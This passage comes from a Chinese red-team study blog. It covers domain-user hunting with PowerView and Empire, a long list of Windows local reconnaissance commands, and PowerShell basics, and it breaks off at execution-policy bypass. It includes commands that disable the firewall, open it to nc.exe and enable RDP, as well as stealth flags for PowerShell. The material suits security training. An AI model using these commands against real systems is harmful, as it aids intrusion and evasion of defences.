class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>PowerView 脚本下载地址：<a href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView">https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView</a></p><blockquote><p>注：在打开上面的下载地址时会看到该项目已被转移到其他项目下，但是当我在使用新版本的 PowerView 脚本时，发现找不到<code>Invoke-StealthUserHunter</code>命令，而旧版本的 PowerView 有<code>Invoke-StealthUserHunter</code>命令</p></blockquote><p><strong>Invoke-StealthUserHunter</strong>：只需要进行一次查询，就可以获取域里面的所有用户。其原理为：从<code>user.HomeDirectories</code>中提取所有用户，并对每个服务器进行<code>Get-NetSession</code>获取。因不需要使用<code>Invoke-UserHunter</code>对每台机器进行操作，所以这个方法的隐蔽性相对较高（但涉及的机器不一定全面）。PowerView 默认使用<code>Invoke-StealthUserHunter</code>如果找不到需要的信息，就会使用<code>Invoke-UserHunter</code>.</p><p><strong>Invoke-UserHunter</strong>：找到域内特定的用户群，接受用户名、用户列表和域组查询，接收一个主机列表或查询可用的主机域名。使用<code>Get-NetSession</code>和<code>Get-NetLoggedon</code>(调用 NetSessionEnum 和 NetWkstaUserEnumAPI )扫描每台服务器并对扫描结果进行比较，从而找出目标用户集，在使用时不需要管理员权限。</p><pre class="line-numbers language-none"><code class="language-none">PS C:\Users\daniel10&gt; Invoke-UserHunterUserDomain   : TEAMSSIXUserName     : AdministratorComputerName : dc.teamssix.comIP           : 192.168.7.7SessionFrom  :LocalAdmin   :UserDomain   : TEAMSSIXUserName     : daniel10ComputerName : daniel10.teamssix.comIP           : 192.168.7.110SessionFrom  :LocalAdmin   :UserDomain   : TEAMSSIXUserName     : AdministratorComputerName : daniel7.teamssix.comIP           : 192.168.7.107SessionFrom  :LocalAdmin   :<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>PowerView 中的其他信息收集模块：</p><ul><li>Get-NetDomain:获取当前用户所在域名称</li><li>Get-NetUser：获取所有用户的详细信息</li><li>Get-NetDomainController：获取所有域控制器的信息</li><li>Get-NetComputer：获取域内所有机器的详细信息</li><li>Get-NetOU：获取域中的OU信息</li><li>Get-NetGroup：获取所有域内组和组成员信息</li><li>Get-NetFileServer：根据SPN获取当前域使用的文件服务器信息</li><li>Get-NetShare：获取当前域内所有的网络共享信息</li><li>Get-NetSession：获取指定服务器的会话</li><li>Get-NetRDPSession：获取指定服务器的远程连接</li><li>Get-NetProcess：获取远程主机的进程</li><li>Get-UserEvent：获取指定用户的日志</li><li>Get-ADObject：获取活动目录的对象</li><li>Get-NetGPO：获取域内所有组的策略对象</li><li>Get-DomainPolicy：获取域默认策略或域控制器策略</li><li>Invoke-UserHunter：获取域用户登陆的计算机信息及该用户是否有本地管理员权限</li><li>Invoke-ProcessHunter：通过查询域内所有的机器进程找到特定用户</li><li>Invoke-UserEventHunter：根据用户日志查询某域用户登陆过哪些域机器</li></ul><h3 id="Empire"><a href="#Empire" class="headerlink" title="Empire"></a>Empire</h3><p>Empire中的<code>user_hunter</code>模块用于查找域管理员登陆的机器，使用 powershell/situational_awareness/network/powerview/user_hunter 模块，可查看哪个用户登陆哪台主机。</p><pre class="line-numbers language-none"><code class="language-none">(Empire: listeners) &gt; agents[*] Active agents: Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen ----     -- -----------     ------------      --------                -------            ---    -----    --------- 3XRCWAB2 ps 192.168.7.7     DC                *TEAMSSIX\administrator powershell         2256   5&#x2F;0.0    2021-02-22 20:39:54(Empire: agents) &gt; usemodule powershell&#x2F;powershell&#x2F;situational_awareness&#x2F;network&#x2F;powerview&#x2F;user_hunter(Empire: powershell&#x2F;situational_awareness&#x2F;network&#x2F;powerview&#x2F;user_hunter) &gt; set Agent 3XRCWAB2(Empire: powershell&#x2F;situational_awareness&#x2F;network&#x2F;powerview&#x2F;user_hunter) &gt; execute[*] Tasked 3XRCWAB2 to run TASK_CMD_JOB[*] Agent 3XRCWAB2 tasked with task ID 1[*] Tasked agent 3XRCWAB2 to run module powershell&#x2F;situational_awareness&#x2F;network&#x2F;powerview&#x2F;user_hunter[*] Valid results returned by 192.168.7.7……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="6、查找域管理员进程"><a href="#6、查找域管理员进程" class="headerlink" title="6、查找域管理员进程"></a>6、查找域管理员进程</h2><h3 id="获取域管理员列表"><a href="#获取域管理员列表" class="headerlink" title="获取域管理员列表"></a>获取域管理员列表</h3><pre class="line-numbers language-none"><code class="language-none">net group &quot;Domain Admins&quot; &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt;net group &quot;Domain Admins&quot; &#x2F;domain这项请求将在域 teamssix.com 的域控制器处理。组名     Domain Admins注释     指定的域管理员成员-------------------------------------------------------------------------------Administrator命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="列出本机的所有进程及进程用户"><a href="#列出本机的所有进程及进程用户" class="headerlink" title="列出本机的所有进程及进程用户"></a>列出本机的所有进程及进程用户</h3><pre class="line-numbers language-none"><code class="language-none">tasklist &#x2F;v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt;tasklist &#x2F;v映像名称                       PID 会话名              会话#       内存使用  状态            用户名                                                 CPU 时间 窗口标题&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;System Idle Process              0 Services                   0          8 K Unknown         NT AUTHORITY\SYSTEM                                    68:35:16 暂缺System                           4 Services                   0        924 K Unknown         暂缺                                                    0:24:14 暂缺svchost.exe                   9228 Console                    2      2,932 K Unknown         TEAMSSIX\daniel10                                       0:00:00 暂缺tasklist.exe                 10768 Console                    2      9,540 K Unknown         TEAMSSIX\daniel10                                       0:00:00 暂缺……内容过多省略……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果在列出的进程中看到了用户名为管理员用户名的话，便是找到了域管理员进程。</p><blockquote><p>参考链接：</p><p><a href="https://blog.csdn.net/qq_36279445/article/details/110647055">https://blog.csdn.net/qq_36279445/article/details/110647055</a></p><p><a href="https://pingmaoer.github.io/2020/03/31/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/">https://pingmaoer.github.io/2020/03/31/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【内网学习笔记】3、本地工作组信息收集</title>
      <link href="//210211-160909.html"/>
      <url>//210211-160909.html</url>
      
        <content type="html"><![CDATA[<h2 id="1、手动收集本地工作组信息"><a href="#1、手动收集本地工作组信息" class="headerlink" title="1、手动收集本地工作组信息"></a>1、手动收集本地工作组信息</h2><ul><li>查看当前权限</li></ul><pre class="line-numbers language-none"><code class="language-none">whoami <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>本机网络配置信息</li></ul><pre class="line-numbers language-none"><code class="language-none">ipconfig &#x2F;all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>操作系统和版本信息（英文版）</li></ul><pre class="line-numbers language-none"><code class="language-none">systeminfo | findstr &#x2F;B &#x2F;C:&quot;OS Name&quot; &#x2F;C:&quot;OS Version&quot; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>操作系统和版本信息（中文版）</li></ul><pre class="line-numbers language-none"><code class="language-none">systeminfo | findstr &#x2F;B &#x2F;C:&quot;OS 名称&quot; &#x2F;C:&quot;OS 版本&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查看系统体系结构</li></ul><pre class="line-numbers language-none"><code class="language-none">echo %PROCESSOR_ARCHITECTURE%<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查看系统所有环境变量</li></ul><pre class="line-numbers language-none"><code class="language-none">set<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查看安装的软件及版本和路径等信息</li></ul><pre class="line-numbers language-none"><code class="language-none">wmic product get name,version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>利用 PowerShell 收集软件版本信息</li></ul><pre class="line-numbers language-none"><code class="language-none">powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查询本机服务信息</li></ul><pre class="line-numbers language-none"><code class="language-none">wmic service list brief<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查询进程列表</li></ul><pre class="line-numbers language-none"><code class="language-none">tasklist &#x2F;v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>wmic 查看进程信息</li></ul><pre class="line-numbers language-none"><code class="language-none">wmic process list brief<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查看启动程序信息</li></ul><pre class="line-numbers language-none"><code class="language-none">wmic startup get command,caption<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查看计划任务</li></ul><pre class="line-numbers language-none"><code class="language-none">schtasks &#x2F;query &#x2F;fo LIST &#x2F;v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查看主机开启时间</li></ul><pre class="line-numbers language-none"><code class="language-none">net statistics workstation<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查询用户列表</li></ul><pre class="line-numbers language-none"><code class="language-none">net user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li> 查看指定用户的信息</li></ul><pre class="line-numbers language-none"><code class="language-none">net user teamssix<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li> 查看本地管理员用户</li></ul><pre class="line-numbers language-none"><code class="language-none">net localgroup administrators<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查看当前在线用户</li></ul><pre class="line-numbers language-none"><code class="language-none">query user || qwinsta<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>列出或断开本地计算机和连接的客户端的会话 </li></ul><pre class="line-numbers language-none"><code class="language-none">net session<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查看端口列表</li></ul><pre class="line-numbers language-none"><code class="language-none">netstat –ano<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查看补丁列表</li></ul><pre class="line-numbers language-none"><code class="language-none">systeminfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>使用 wmic 查看补丁列表</li></ul><pre class="line-numbers language-none"><code class="language-none">wmic qfe get Caption,Description,HotFixID,InstalledOn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查看本机共享</li></ul><pre class="line-numbers language-none"><code class="language-none">net share<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>使用 wmic 查看共享列表</li></ul><pre class="line-numbers language-none"><code class="language-none">wmic share get name,path,status<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查询路由表及所有可用接口的ARP 缓存表 </li></ul><pre class="line-numbers language-none"><code class="language-none">route printarp –a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li><p>查询防火墙相关配置 </p><ul><li>关闭防火墙</li></ul><pre class="line-numbers language-none"><code class="language-none">netsh firewall set opmode disable (Windows Server 2003 系统及之前版本)netsh advfirewall set allprofiles state off(Windows Server 2003 系统及之后版本)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>查看防火墙配置</li></ul><pre class="line-numbers language-none"><code class="language-none">netsh firewall show config<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>修改防火墙配置</li></ul><pre class="line-numbers language-none"><code class="language-none">(Windows Server 2003 系统及之前版本)允许指定程序全部连接netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enable(Windows Server 2003 之后系统版本)允许指定程序连入netsh advfirewall firewall add rule name&#x3D;&quot;pass nc&quot; dir&#x3D;in action&#x3D;allow program&#x3D;&quot;C: \nc.exe&quot;允许指定程序连出netsh advfirewall firewall add rule name&#x3D;&quot;Allow nc&quot; dir&#x3D;out action&#x3D;allow program&#x3D;&quot;C: \nc.exe&quot;允许 3389 端口放行netsh advfirewall firewall add rule name&#x3D;&quot;Remote Desktop&quot; protocol&#x3D;TCP dir&#x3D;in localport&#x3D;3389 action&#x3D;allow<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>自定义防火墙日志储存位置</li></ul><pre class="line-numbers language-none"><code class="language-none">netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\fw.log&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>查看计算机代理配置情况 </p></li></ul><pre class="line-numbers language-none"><code class="language-none">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>查询并开启远程连接服务</p><ul><li>查看远程连接端口（0xd3d换成10进制即3389）</li></ul><pre class="line-numbers language-none"><code class="language-none">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;V PortNumber<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>在Windows Server 2003 中开启3389 端口</li></ul><pre class="line-numbers language-none"><code class="language-none">wmic path win32_terminalservicesetting where (__CLASS !&#x3D;&quot;&quot;) call setallowtsconnections 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>在Windows Server 2008 和Windows Server 2012 中开启3389 端口</li></ul><pre class="line-numbers language-none"><code class="language-none">wmic &#x2F;namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !&#x3D;&quot;&quot;) call setallowtsconnections 1wmic &#x2F;namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName&#x3D;&#39;RDP-Tcp&#39;) call setuserauthenticationrequired 1reg add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; &#x2F;v fSingleSessionPerUser &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="2、自动收集本地工作组信息"><a href="#2、自动收集本地工作组信息" class="headerlink" title="2、自动收集本地工作组信息"></a>2、自动收集本地工作组信息</h2><h3 id="wmic-脚本"><a href="#wmic-脚本" class="headerlink" title="wmic 脚本"></a>wmic 脚本</h3><p>wmic 脚本下载地址：<a href="https://www.fuzzysecurity.com/scripts/files/wmic_info.rar">https://www.fuzzysecurity.com/scripts/files/wmic_info.rar</a></p><p>直接将脚本在目标主机上运行，运行结束后会生成一个 output.html 文件</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-02-11_12-59-56.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h3 id="PowerShsell-Empire"><a href="#PowerShsell-Empire" class="headerlink" title="PowerShsell Empire"></a>PowerShsell Empire</h3><p>PowerShsell Empire中文简称 “帝国” ，是一款针对 Windows 系统平台而打造的渗透工具，以下是 Empire 和万能的 MSF 的一些区别。</p><ul><li><p>MSF 是全平台的，无论是win，linux，mac都可以打，但 Empire 是只针对 Windows 的</p></li><li><p>MSF 集信息收集，渗透，后渗透，木马，社工的功能为一体，全面多能；而 Empire 专注于内网渗透，它是针对 PowerShell 的</p></li></ul><p>当使用 Empire 使主机上线后，可调用<code>powershell/situational_awareness/host/winenum</code>模块查看本机用户信息、系统基本信息、剪贴板等等信息。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-02-11_15-27-11.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>调用<code>powershell/situational_awareness/host/computerdetails</code>模块可查看更丰富的信息，比如RDP登录信息、主机时间日志等等，在运行这个模块时需要管理员权限。</p><blockquote><p>参考链接：</p><p><a href="https://www.freebuf.com/sectool/158393.html">https://www.freebuf.com/sectool/158393.html</a></p><p><a href="https://www.freebuf.com/articles/system/114731.html">https://www.freebuf.com/articles/system/114731.html</a></p><p><a href="https://blog.csdn.net/bring_coco/article/details/113550173">https://blog.csdn.net/bring_coco/article/details/113550173</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【内网学习笔记】2、PowerShell</title>
      <link href="//210206-191859.html"/>
      <url>//210206-191859.html</url>
      
        <content type="html"><![CDATA[<h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>PowerShell 可以简单的理解为 cmd 的高级版，cmd 能做的事在 PowerShell 中都能做，但 PowerShell 还能做很多 cmd 不能做的事情。</p><p>PowerShell 内置在 Windows 7、Windows Server 2008 R2 及更高版本的 Windows 系统中，同时 PowerShell 是构建在 .NET 平台上的，所有命令传递的都是 .NET 对象。</p><p>PowerShell 有如下特点：</p><ul><li>Windows 7 以上的操作系统默认安装</li><li>PowerShell 脚本可以运行在内存中，不需要写入磁盘</li><li>可以从另一个系统中下载 PowerShell 脚本并执行</li><li>目前很多工具都是基于 PowerShell 开发的</li><li>很多安全软件检测不到 PowerShell 的活动</li><li>cmd 通常会被阻止运行，但是 PowerShell 不会</li><li>可以用来管理活动目录</li></ul><p>可输入 Get-Host 或者 $PSVersionTable 查看 PowerShell 版本：</p><pre class="line-numbers language-none"><code class="language-none">PS C:\Users\teamssix&gt; Get-HostName             : ConsoleHostVersion          : 5.1.18362.1171InstanceId       : a0a6f8f2-f86a-477f-bf4b-b94b452bee3cUI               : System.Management.Automation.Internal.Host.InternalHostUserInterfaceCurrentCulture   : zh-CNCurrentUICulture : zh-CNPrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxyDebuggerEnabled  : TrueIsRunspacePushed : FalseRunspace         : System.Management.Automation.Runspaces.LocalRunspace<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">PS C:\Users\teamssix&gt; $PSVersionTableName                           Value----                           -----PSVersion                      5.1.18362.1171PSEdition                      DesktopPSCompatibleVersions           &#123;1.0, 2.0, 3.0, 4.0...&#125;BuildVersion                   10.0.18362.1171CLRVersion                     4.0.30319.42000WSManStackVersion              3.0PSRemotingProtocolVersion      2.3SerializationVersion           1.1.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Windows 操作系统对应的 PowerShell 版本信息：</p><p>1.0        windows server 2008</p><p>2.0        windows server 2008 r2、windows 7</p><p>3.0        windows server 2012、windows 8</p><p>4.0        windows server 2012 r2、windows 8.1</p><p>5.0        windows 10</p><p>5.1        windows server 2016</p><h2 id="2、基本概念"><a href="#2、基本概念" class="headerlink" title="2、基本概念"></a>2、基本概念</h2><h3 id="ps1-文件"><a href="#ps1-文件" class="headerlink" title="ps1 文件"></a>ps1 文件</h3><p>ps1 是PowerShell 的脚本扩展名，一个 PowerShell 脚本文件其实就是一个简单的文本文件。</p><h3 id="执行策略"><a href="#执行策略" class="headerlink" title="执行策略"></a>执行策略</h3><p>为了防止恶意脚本在 PowerShell 中被运行，PowerShell 有个执行策略，默认情况下，这个执行策略是受限模式<code>Restricted</code>。</p><p>使用 <code>Get-ExecutionPolicy</code>命令查看当前执行策略</p><pre class="line-numbers language-none"><code class="language-none">PS C:\Users\teamssix&gt; Get-ExecutionPolicyRestricted<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>执行策略有以下几种：</p><p><strong>Restricted</strong>：不能运行脚本</p><p><strong>RemoteSigned</strong>：本地创建的脚本可以运行，但从网上下载的脚本不能运行（除非它们拥有由受信任的发布者签署的数字签名）</p><p><strong>AllSigned</strong>：仅当脚本由受信任的发布者签名才能运行。 </p><p><strong>Unrestricted</strong>：脚本执行不受限制，不管来自哪里，也不管它们是否有签名。</p><p>使用<code>Set-ExecutionPolicy &lt;policy name&gt;</code>设置执行策略，该命令需要管理员权限</p><pre class="line-numbers language-none"><code class="language-none">PS C:\WINDOWS\system32&gt; Set-ExecutionPolicy Unrestricted执行策略更改执行策略可帮助你防止执行不信任的脚本。更改执行策略可能会产生安全风险，如 https:&#x2F;go.microsoft.com&#x2F;fwlink&#x2F;?LinkID&#x3D;135170 中的 about_Execution_Policies 帮助主题所述。是否要更改执行策略?[Y] 是(Y)  [A] 全是(A)  [N] 否(N)  [L] 全否(L)  [S] 暂停(S)  [?] 帮助 (默认值为“N”): APS C:\WINDOWS\system32&gt; Get-ExecutionPolicyUnrestricted<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h3><p>PowerShell 运行脚本的方式和其他 shell 基本一致，可以输入完整路径运行，也可以到 ps1 文件所在目录下去运行，具体如下：</p> <pre class="line-numbers language-none"><code class="language-none">PS C:\Users\teamssix&gt; C:\t.ps1hello TeamsSixPS C:\Users\teamssix&gt; cd C:\PS C:\&gt; .\t.ps1hello TeamsSix<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>这里不禁想吐槽一下，在看百度百科的时候关于 PowerShell 运行脚本的描述是这样的：“假设你要运行一个名为a.ps1的脚本，你可以键入 C:\Scripts\aps1，最大的例外是，如果 PowerShell 脚本文件刚好位于你的系统目录中，那么你可以直接在命令提示符命令提示符后键入脚本文件名即可运行”</p><p>这里的“系统目录”是指的啥目录？C:\还是C:\windows\system目录，“最大的例外”又是什么鬼，讲道理读起来有一种机翻的感觉。</p></blockquote><h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><p>PowerShell 中的管道类似于 linux 中的管道，都是将前一个命令的输出作为另一个命令的输入，两个命令之间使用 “|” 进行连接。</p><p>例如，在 PowerShell 中获取进程信息并以程序 ID 进行排序</p><pre class="line-numbers language-none"><code class="language-none">PS C:\&gt; Get-Process | Sort-Object IDHandles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName-------  ------    -----      -----     ------     --  -- -----------      0       0       60          8                 0   0 Idle   3038       0      208       4760                 4   0 System      0      12     7732      81344                88   0 Registry     53       3     1160        752               368   0 smss    256      10     2468       7424               424   0 svchost    662      21     1788       4668               504   0 csrss    160      11     1364       5660               580   0 wininit    653      27    18592     177580               588   1 csrss   1219      67    59660         52       2.59    600   1 WinStore.App    278      14     3108      15656               684   1 winlogon    687      11     5420       9432               724   0 services<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3、一些命令"><a href="#3、一些命令" class="headerlink" title="3、一些命令"></a>3、一些命令</h2><blockquote><p>-NoLogo：启动不显示版权标志的PowerShell</p><p>-WindowStyle Hidden (-W Hidden)：隐藏窗口</p><p>-NoProfile (-NoP)：不加载当前用户的配置文件</p><p>–Enc：执行 base64 编码后的 powershell 脚本字符串</p><p>-ExecutionPolicy Bypass (-Exec Bypass) ：绕过执行安全策略</p><p>-Noexit：执行后不退出Shell，这在使用键盘记录等脚本时非常重要</p><p>-NonInteractive (-Nonl)：非交互模式，PowerShell 不为用户提供交互的提示</p></blockquote><p>在 PowerShell 下，命令的命名规范很一致，都采用了动词-名词的形式，如 Net-Item，动词一般为 Add、New、Get、Remove、Set 等。PowerShell 还兼容 cmd 和 Linux 命令，如查看目录可以使用 dir 或者 ls 。</p><h3 id="文件操作类命令"><a href="#文件操作类命令" class="headerlink" title="文件操作类命令"></a>文件操作类命令</h3><pre class="line-numbers language-none"><code class="language-none">新建目录test：New-Item test -ItemType directory删除目录test：Remove-Item test新建文件test.txt：New-Item test.txt -ItemType file新建文件test.txt，内容为 hello：New-Item test.txt -ItemType file -value &quot;hello&quot;删除文件test.txt：Remove-Item test.txt查看文件test.txt内容：Get-Content  test.txt设置文件test.txt内容t：Set-Content  test.txt  -Value &quot;hello&quot;给文件test.txt追加内容：Add-Content test.txt  -Value &quot;,word!&quot;清除文件test.txt内容：Clear-Content test.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="绕过本地权限并执行"><a href="#绕过本地权限并执行" class="headerlink" title="绕过本地权限并执行"></a>绕过本地权限并执行</h3><p>上面说到了默认情况下 PowerShell 的执行策略是受限模式<code>Restricted</code>，这就导致了在渗透测试过程中我们需要采用一些方法绕过这个策略，从而执行我们的脚本文件。</p><p>先来看看默认受限模式下执行脚本的情况</p><pre class="line-numbers language-none"><code class="language-none">PS C:\Users\teamssix&gt; powerShell.exe Get-ExecutionPolicyRestrictedPS C:\Users\teamssix&gt; PowerShell.exe -File t.ps1无法加载文件 C:\Users\teamssix\t.ps1，因为在此系统上禁止运行脚本。有关详细信息，请参阅 https:&#x2F;go.microsoft.com&#x2F;fwlink&#x2F;?LinkID&#x3D;135170 